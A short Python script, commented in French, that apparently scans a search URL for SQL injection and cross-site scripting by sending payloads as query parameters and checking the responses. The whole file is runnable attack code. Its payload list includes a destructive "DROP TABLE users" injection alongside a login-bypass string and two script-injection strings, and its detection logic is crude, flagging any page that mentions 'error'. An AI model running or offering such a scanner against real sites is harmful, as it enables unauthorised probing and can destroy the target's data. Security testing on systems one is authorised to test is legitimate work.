import requests

# Fonction pour tester l'injection SQL
def test_sql_injection(url, payload):
    try:
        response = requests.get(url, params={"query": payload})
        if response.status_code == 200:
            if "error" in response.text.lower():
                print(f"Vulnérabilité SQL détectée sur {url} avec le payload : {payload}")
    except Exception as e:
        print(f"Erreur lors de la requête vers {url}: {str(e)}")

# Fonction pour tester la faille XSS
def test_xss(url, payload):
    try:
        response = requests.get(url, params={"input": payload})
        if response.status_code == 200:
            if payload in response.text:
                print(f"Vulnérabilité XSS détectée sur {url} avec le payload : {payload}")
    except Exception as e:
        print(f"Erreur lors de la requête vers {url}: {str(e)}")

# URL du site à tester
site_url = "http://exemple.com/search"

# Payloads personnalisables
sql_payloads = ["' OR '1'='1'", "1'; DROP TABLE users; --"]
xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

# Test de l'injection SQL
for payload in sql_payloads:
    test_sql_injection(site_url, payload)

# Test de la faille XSS
for payload in xss_payloads:
    test_xss(site_url, payload)
